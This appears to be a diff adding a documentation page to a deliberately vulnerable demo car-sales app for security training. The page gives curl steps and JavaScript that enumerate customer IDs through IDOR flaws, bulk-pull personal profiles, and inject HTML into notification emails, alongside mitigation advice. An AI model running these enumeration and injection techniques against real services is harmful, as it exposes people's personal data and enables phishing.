+                  <li><strong>Credential Harvesting:</strong> Collect stolen credentials from phishing site</li>
+                  <li><strong>Appointment DOS Attack:</strong> Book all available appointment slots using stolen user IDs to shut down dealership operations</li>
+                  <li><strong>Business Disruption:</strong> Monitor and maintain control over critical business functions</li>
+                </ol>
+              </div>
+            </div>
+
+            <!-- Testing the Email System -->
+            <div class="card mb-4" id="email-testing">
+              <div class="card-header">
+                <h6 class="mb-0">Testing the Email Notification System</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>Quick Test Workflow:</strong></p>
+                <ol>
+                  <li><strong>Create a malicious search:</strong> Use harvested UUID to create search with HTML in name</li>
+                  <li><strong>Set broad criteria:</strong> Low price limit ($1) to match most cars</li>
+                  <li><strong>Trigger notifications:</strong> Use trigger endpoint to simulate new cars</li>
+                  <li><strong>View Gmail-style preview:</strong> See the actual email rendering with HTML injection</li>
+                </ol>
+
+                <p><strong>Example Test Sequence:</strong></p>
+                <pre><code># Step 1: Get a user ID from saved searches enumeration  
+curl "http://localhost:3000/demo1/api/saved-searches/5765321"
+# Response: {"userId": "ab123456-78cd-9012-ef34-567890abcdef", ...}
+
+# Step 2: Create malicious search for that user
+curl -X POST "http://localhost:3000/demo1/api/saved-searches" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "userId": "ab123456-78cd-9012-ef34-567890abcdef",
+    "name": "&lt;a href=\"http://acmecorp.com\"&gt;Click Here&lt;/a&gt;",
+    "searchCriteria": {"minPrice": "1"}
+  }'
+
+# Step 3: Trigger email notifications
+curl -X POST "http://localhost:3000/demo1/trigger-notifications"
+
+# Step 4: View the malicious emails in Gmail-style interface
+# Visit: http://localhost:3000/demo1/emails</code></pre>
+
+                <div class="alert alert-info">
+                  <strong>Gmail-Style Email Preview:</strong> The application now includes a complete Gmail-style email interface at <code>/demo1/emails</code> where you can see exactly how the HTML injection appears to victims. Each email shows both the rendered HTML and the raw source code.
+                </div>
+              </div>
+            </div>
+
+            <!-- Gmail-Style Email Preview System -->
+            <div class="card mb-4">
+              <div class="card-header">
+                <h6 class="mb-0">Gmail-Style Email Preview System</h6>
+              </div>
+              <div class="card-body">
+                <p><strong>New Feature:</strong> AutoFinder now includes a complete email preview system that demonstrates how HTML injection attacks appear in real email clients.</p>
+                
+                <p><strong>Email Preview Endpoints:</strong></p>
+                <ul>
+                  <li><code>/demo1/emails</code> - Gmail-style inbox showing all sent emails</li>
+                  <li><code>/demo1/emails/:id</code> - Individual email view with HTML injection analysis</li>
+                  <li>Accessible via "📧 Email Preview" link in the main navigation</li>
+                </ul>
+
+                <p><strong>What You Can See:</strong></p>
+                <ul>
+                  <li><strong>Professional Email Interface:</strong> Gmail-like design that victims would trust</li>
+                  <li><strong>HTML Injection Rendering:</strong> See exactly how malicious content appears</li>
+                  <li><strong>Raw HTML Source:</strong> View the unescaped HTML code that gets sent</li>
+                  <li><strong>Vulnerability Analysis:</strong> Detailed breakdown of injection points and risks</li>
+                  <li><strong>Real-time Updates:</strong> New emails appear immediately after sending</li>
+                </ul>
+
+                <p><strong>Demo Workflow with Email Preview:</strong></p>
+                <pre><code># 1. Navigate to AutoFinder and create a search with HTML injection
+# Search name: &lt;a href="http://acmecorp.com"&gt;Click Here&lt;/a&gt;
+
+# 2. Save the search to trigger email notification
+
+# 3. Click "📧 Email Preview" in navigation to see Gmail interface
+
+# 4. View the sent email to see how HTML injection renders
+
+# 5. Click "View HTML Source" to see the raw malicious code</code></pre>
+
+                <p><strong>Educational Value:</strong></p>
+                <ul>
+                  <li>Demonstrates real-world impact of HTML injection vulnerabilities</li>
+                  <li>Shows how professional-looking emails can contain malicious content</li>
+                  <li>Provides visual evidence of security flaws for presentations</li>
+                  <li>Helps understand user perspective in phishing attacks</li>
+                </ul>
+
+                <div class="alert alert-warning">
+                  <strong>Security Awareness:</strong> The email preview system shows why input sanitization is critical. Even "harmless" HTML injection can be weaponized for sophisticated phishing attacks when combined with official company branding.
+                </div>
+              </div>
+            </div>
+
+            <!-- Mitigation -->
+            <h5 class="text-primary mb-3">Mitigation Strategies</h5>
+            
+            <div class="alert alert-warning">
+              <h6>RECOMMENDED FIXES</h6>
+              <ul class="mb-0">
+                <li><strong>Implement proper authorization:</strong> Validate user ownership before returning data</li>
+                <li><strong>Use UUIDs properly:</strong> Don't expose sequential or guessable IDs</li>
+                <li><strong>Input validation:</strong> Sanitize and encode all user input</li>
+                <li><strong>Rate limiting:</strong> Implement API rate limiting to prevent enumeration</li>
+                <li><strong>Access controls:</strong> Implement role-based access controls</li>
+                <li><strong>Audit logging:</strong> Log all API access for monitoring</li>
+              </ul>
+            </div>
+
+            <!-- Testing Tools -->
+            <h5 class="text-primary mb-3">Testing Tools</h5>
+            
+            <div class="row">
+              <div class="col-md-6">
+                <div class="card">
+                  <div class="card-header">
+                    <h6 class="mb-0">Manual Testing</h6>
+                  </div>
+                  <div class="card-body">
+                    <ul class="list-unstyled">
+                      <li>[+] Browser Developer Tools</li>
+                      <li>[+] curl / wget</li>
+                      <li>[+] Postman</li>
+                      <li>[+] Burp Suite</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="card">
+                  <div class="card-header">
+                    <h6 class="mb-0">Automated Testing</h6>
+                  </div>
+                  <div class="card-body">
+                    <ul class="list-unstyled">
+                      <li>[+] OWASP ZAP</li>
+                      <li>[+] Nikto</li>
+                      <li>[+] Custom scripts</li>
+                      <li>[+] Nuclei templates</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    // User Enumeration Functions - IDOR Vulnerability Demonstration for Documentation Page
+    async function enumerateUser() {
+      let userId = document.getElementById('targetUserId').value.trim();
+      
+      // If no user ID provided, try to get one from the system
+      if (!userId) {
+        try {
+          const userIdsResponse = await fetch('/demo1/api/demo-user-ids');
+          const userIdsData = await userIdsResponse.json();
+          if (userIdsData.userIds && userIdsData.userIds.length > 0) {
+            userId = userIdsData.userIds[0];
+            document.getElementById('targetUserId').value = userId;
+          } else {
+            alert('Please enter a user ID to enumerate. You can obtain user IDs from the saved search IDOR attacks described above.');
+            return;
+          }
+        } catch (error) {
+          alert('Please enter a user ID to enumerate. You can obtain user IDs from the saved search IDOR attacks described above.');
+          return;
+        }
+      }
+      
+      try {
+        const response = await fetch(`/sell-my-car/api/customer/${userId}`);
+        const userData = await response.json();
+        
+        if (response.ok) {
+          displayUserData([userData]);
+        } else {
+          showUserEnumerationResult(`
+            <div class="alert alert-danger">
+              <h6><i class="bi bi-exclamation-triangle me-2"></i>User Not Found</h6>
+              <p>${userData.message || 'User ID not found in system'}</p>
+              <p><strong>Attempted User ID:</strong> <code>${userId}</code></p>
+              <p><strong>Note:</strong> Use the IDOR attacks described above to obtain valid user IDs first.</p>
+            </div>
+          `);
+        }
+      } catch (error) {
+        console.error('User enumeration failed:', error);
+        showUserEnumerationResult(`
+          <div class="alert alert-danger">
+            <h6><i class="bi bi-exclamation-triangle me-2"></i>Enumeration Error</h6>
+            <p>Failed to enumerate user details. This could indicate network issues or server unavailability.</p>
+            <p><strong>Technical Details:</strong> ${error.message}</p>
+          </div>
+        `);
+      }
+    }
+    
+    async function bulkEnumerateUsers() {
+      showUserEnumerationResult(`
+        <div class="alert alert-warning">
+          <h6><i class="bi bi-arrow-clockwise spin me-2"></i>Initializing Bulk User Enumeration</h6>
+          <p>Attempting to collect user IDs from the system for mass data theft demonstration...</p>
+          <div class="progress mb-3">
+            <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 0%" id="bulkProgress"></div>
+          </div>
+          <div id="bulkProgressStatus">Collecting target user IDs...</div>
+        </div>
+      `);
+      
+      // Get list of valid user IDs from the system
+      let allUserIds = [];
+      try {
+        const userIdsResponse = await fetch('/demo1/api/demo-user-ids');
+        const userIdsData = await userIdsResponse.json();
+        allUserIds = userIdsData.userIds || [];
+      } catch (error) {
+        console.error('Failed to get user IDs:', error);
+        showUserEnumerationResult(`
+          <div class="alert alert-danger">
+            <h6><i class="bi bi-exclamation-triangle me-2"></i>Target Collection Failed</h6>
+            <p>Unable to collect user IDs for bulk enumeration. This would typically be done using the IDOR attacks described above.</p>
+            <p><strong>In a real attack:</strong> You would first use the saved search IDOR vulnerability to collect dozens or hundreds of user IDs, then enumerate each one.</p>
+          </div>
+        `);
+        return;
+      }
+      
+      if (allUserIds.length === 0) {
+        showUserEnumerationResult(`
+          <div class="alert alert-warning">
+            <h6><i class="bi bi-exclamation-triangle me-2"></i>No Target Users Available</h6>
+            <p>No user IDs available for bulk enumeration demonstration.</p>
+            <p><strong>In a real attack:</strong> You would first perform the IDOR attacks described above to collect user IDs, then use this bulk enumeration technique to steal personal data from all discovered users.</p>
+          </div>
+        `);
+        return;
+      }
+      
+      const enumeratedUsers = [];
+      const maxUsers = Math.min(10, allUserIds.length); // Limit to 10 users for demo
+      
+      // Update status
+      document.getElementById('bulkProgressStatus').textContent = 
+        `Collected ${allUserIds.length} user IDs. Beginning data theft of first ${maxUsers} users...`;
+      
+      for (let i = 0; i < maxUsers; i++) {
+        const userId = allUserIds[i];
+        
+        // Update progress
+        document.getElementById('bulkProgressStatus').textContent = 
+          `Stealing data from user ${i + 1}/${maxUsers}: ${userId.substring(0, 8)}...`;
+        
+        try {
+          const response = await fetch(`/sell-my-car/api/customer/${userId}`);
+          if (response.ok) {
+            const userData = await response.json();
+            enumeratedUsers.push(userData);
+          }
+        } catch (error) {
+          console.error(`Failed to enumerate user ${userId}:`, error);
+        }
+        
+        // Update progress bar
+        const progress = ((i + 1) / maxUsers) * 100;
+        document.getElementById('bulkProgress').style.width = progress + '%';
+        
+        // Small delay to show progress and avoid overwhelming the server
+        await new Promise(resolve => setTimeout(resolve, 300));
+      }
+      
+      if (enumeratedUsers.length > 0) {
+        displayUserData(enumeratedUsers, true);
+      } else {
+        showUserEnumerationResult(`
+          <div class="alert alert-warning">
+            <h6><i class="bi bi-exclamation-triangle me-2"></i>Data Theft Unsuccessful</h6>
+            <p>Unable to steal user data. The target user IDs may be invalid or the system may be temporarily unavailable.</p>
+            <p><strong>In a real scenario:</strong> An attacker would typically achieve high success rates when using freshly collected user IDs from IDOR attacks.</p>
+          </div>
+        `);
+      }
+    }
+    
+    function displayUserData(users, isBulk = false) {
+      const title = isBulk ? 
+        `Mass Data Theft Results - ${users.length} Users Compromised` : 
+        'Single User Data Theft Result';
+      
+      const attackType = isBulk ? 'Bulk User Enumeration' : 'Targeted User Enumeration';
+      
+      let resultsHTML = `
+        <div class="alert alert-danger">
+          <h5><i class="bi bi-shield-exclamation me-2"></i>${title}</h5>
+          <p><strong>CRITICAL SECURITY BREACH:</strong> Successfully extracted personal information without any authorization checks.</p>
+          <p><strong>Attack Method:</strong> ${attackType} via IDOR vulnerability in /sell-my-car/api/customer/{userID}</p>
+          <p><strong>Data Exposure:</strong> Complete personal profiles including contact information and vehicle ownership details.</p>
+        </div>
+        
+        <div class="table-responsive">
+          <table class="table table-dark table-striped table-sm">
+            <thead>
+              <tr>
+                <th>User ID</th>
+                <th>Full Name</th>
+                <th>Email Address</th>
+                <th>Phone Number</th>
+                <th>Location</th>
+                <th>Owned Vehicles</th>
+                <th>Last Activity</th>
+              </tr>
+            </thead>
+            <tbody>
+      `;
+      
+      users.forEach(user => {
+        const carList = user.ownedCars.map(car => `${car.year} ${car.make} ${car.model}`).join(', ') || 'No vehicles registered';
+        const location = user.fullProfile?.contactInfo?.mailingAddress?.region || user.zipCode;
+        const lastActivity = new Date(user.fullProfile?.lastLogin || new Date()).toLocaleString();
+        
+        resultsHTML += `
+          <tr>
+            <td><code>${user.claimId.substring(0, 13)}...</code></td>
+            <td><strong style="color: #f38ba8;">${user.firstName} ${user.lastName}</strong></td>
+            <td><a href="mailto:${user.email}" style="color: #89b4fa;">${user.email}</a></td>
+            <td><a href="tel:${user.phone}" style="color: #89b4fa;">${user.phone}</a></td>
+            <td>${location}</td>
+            <td class="small">${carList}</td>
+            <td class="small">${lastActivity}</td>
+          </tr>
+        `;
+      });
+      
+      resultsHTML += `
+            </tbody>
+          </table>
+        </div>
+        
+        <div class="row">
+          <div class="col-md-6">
+            <div class="alert alert-danger">
+              <h6><i class="bi bi-exclamation-triangle me-2"></i>Personal Information Compromised</h6>
+              <ul class="mb-0">
+                <li><strong>Identity Data:</strong> Real names and contact information</li>
+                <li><strong>Communication Channels:</strong> Email addresses and phone numbers</li>
+                <li><strong>Geographic Data:</strong> Home addresses and zip codes</li>
+                <li><strong>Asset Information:</strong> Vehicle ownership details</li>
+                <li><strong>Behavioral Data:</strong> Login patterns and activity timestamps</li>
+              </ul>
+            </div>
+          </div>
+          <div class="col-md-6">
+            <div class="alert alert-warning">
+              <h6><i class="bi bi-shield-exclamation me-2"></i>Attack Escalation Potential</h6>
+              <ul class="mb-0">
+                <li><strong>Identity Theft:</strong> Sufficient data for account takeovers</li>
+                <li><strong>Social Engineering:</strong> Personal details enable convincing attacks</li>
+                <li><strong>Phishing Campaigns:</strong> Email addresses for targeted fraud</li>
+                <li><strong>Physical Security:</strong> Home addresses enable real-world attacks</li>
+                <li><strong>Financial Fraud:</strong> Vehicle data for insurance/loan fraud</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        
+        <div class="alert alert-info">
+          <h6><i class="bi bi-info-circle me-2"></i>Remediation Required</h6>
+          <p><strong>Immediate Actions:</strong></p>
+          <ul class="mb-0">
+            <li>Implement proper authorization checks for the /sell-my-car/api/customer endpoint</li>
+            <li>Validate that requesting users can only access their own profile data</li>
+            <li>Add audit logging for all customer data access attempts</li>
+            <li>Implement rate limiting to prevent bulk enumeration attacks</li>
+            <li>Consider requiring additional authentication for sensitive profile access</li>
+          </ul>
+        </div>
+      `;
+      
+      showUserEnumerationResult(resultsHTML);
+    }
+    
+    function showUserEnumerationResult(content) {
+      document.getElementById('userEnumerationContent').innerHTML = content;
+      document.getElementById('userEnumerationResults').style.display = 'block';
+      document.getElementById('userEnumerationResults').scrollIntoView({ behavior: 'smooth' });
+    }
+  </script>
+</body>
+</html>
